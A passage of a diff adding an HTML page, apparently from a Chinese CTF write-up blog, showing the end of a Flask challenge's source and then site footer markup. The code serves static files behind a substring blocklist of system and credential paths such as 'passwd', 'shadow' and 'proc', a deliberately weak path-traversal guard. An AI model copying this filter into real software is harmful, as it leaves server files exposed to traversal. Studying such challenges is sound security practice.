+</span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Credentials&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&lt;path:file&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">static_file</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">restricted_keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;proc&#34;</span><span class="p">,</span> <span class="s2">&#34;env&#34;</span><span class="p">,</span> <span class="s2">&#34;passwd&#34;</span><span class="p">,</span> <span class="s2">&#34;shadow&#34;</span><span class="p">,</span> <span class="s2">&#34;hosts&#34;</span><span class="p">,</span> <span class="s2">&#34;sys&#34;</span><span class="p">,</span> <span class="s2">&#34;log&#34;</span><span class="p">,</span> <span class="s2">&#34;etc&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                           <span class="s2">&#34;bin&#34;</span><span class="p">,</span> <span class="s2">&#34;lib&#34;</span><span class="p">,</span> <span class="s2">&#34;tmp&#34;</span><span class="p">,</span> <span class="s2">&#34;var&#34;</span><span class="p">,</span> <span class="s2">&#34;run&#34;</span><span class="p">,</span> <span class="s2">&#34;dev&#34;</span><span class="p">,</span> <span class="s2">&#34;home&#34;</span><span class="p">,</span> <span class="s2">&#34;boot&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">keyword</span> <span class="ow">in</span> <span class="n">file</span> <span class="k">for</span> <span class="n">keyword</span> <span class="ow">in</span> <span class="n">restricted_keywords</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;STOP!&#34;</span><span class="p">,</span> <span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;./static/&#34;</span> <span class="o">+</span> <span class="n">file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Not found!&#34;</span><span class="p">,</span> <span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&#34;./static/&#34;</span> <span class="o">+</span> <span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/2025-%E8%BD%A9%E8%BE%95ctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-轩辕ctf</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-iscc-%E6%80%BB%E5%86%B3%E8%B5%9Bweb1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-iscc-总决赛web1</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2023-newstar-web/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2023-newstar-web</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-iscc-%E6%A0%A1%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-iscc-校赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-nss5%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-nss5月每日一题</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
